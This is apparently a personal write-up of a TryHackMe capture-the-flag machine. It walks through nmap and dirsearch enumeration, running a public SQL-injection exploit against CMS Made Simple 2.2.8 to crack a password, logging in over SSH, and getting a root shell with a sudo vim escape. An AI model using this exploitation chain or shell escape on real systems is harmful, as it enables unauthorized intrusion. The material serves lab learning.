We start the machine on `TryHackMe`.

# Nmap scan
First of all we need to execute a nmap scan:
```bash
nmap -A -T4 -p- IP_HOST
```
- ![[Pasted image 20250116160658.png]]
- ![[Pasted image 20250116160715.png]]


# FTP path
We can try to login as `anonymous` in the FTP service:
```bash
ftp HOST_IP

anonymous
```
- ![[Pasted image 20250116160842.png]]

So nothing to see in it.


# HTTP path
So we visit the webpage of the `IP`:
- ![[Pasted image 20250116160934.png]]

In `NMAP` we can see that there is the directory `/openmr-5_0_1_3` but it is not found:
- ![[Pasted image 20250116161017.png]]

## dirsearch

This tool can be found there:
- [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)


So we can use the command `dirsearch` in order to enumerate the files and pages on the http server:
```bash
python3 dirsearch.py -u http://IP -e php,html -x 400,401,403 
```
- ![[Pasted image 20250116161310.png]]



At this point we access to the folder `/simple` in order to see what it contains:
- ![[Pasted image 20250116161403.png]]

We can see that it uses `CMS` at version `2.2.8`:
- ![[Pasted image 20250116161436.png]]

So let's try to exploit it.


# Exploiting CMS 2.2.8
On google we search for `cms made simple 2.2.8 exploit` and we found a `sqli`
- ![[Pasted image 20250116161608.png]]



Now we need to run the exploit:
```bash
python 46635.py -u http://IP/simple --crack -w top100_list.txt
```
- `--crack` tries to crack the passwords found in it using a wordlist `-w`
- the wordlist can be found there [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt)


The result of the exploit will be:
- ![[Pasted image 20250116161946.png]]
- it was not cracked because maybe the wordlist was small

We run with a longer wordlist and we get `secret` as password
- we can also find it searching on google


## ssh access
At this point we try to access with the found username `mitch` and the password `secret`
```bash
ssh mitch@IP -p 2222
```
- ![[Pasted image 20250116162251.png]]
- we are in


## priv escalation
At this point we run:
```bash
ls -la

cat .bash_history
```
- ![[Pasted image 20250116162401.png]]
- ![[Pasted image 20250116162413.png]]

But no credentials found.


So we try with `sudo` escalation:
```bash
sudo -l
```
- ![[Pasted image 20250116162503.png]]

So using `GTFOBins` we get the root shell:
```bash
sudo vim -c ':!/bin/sh'
```
- ![[Pasted image 20250116162550.png]]


<mark style="background: #BBFABBA6;">We gain the root!</mark>
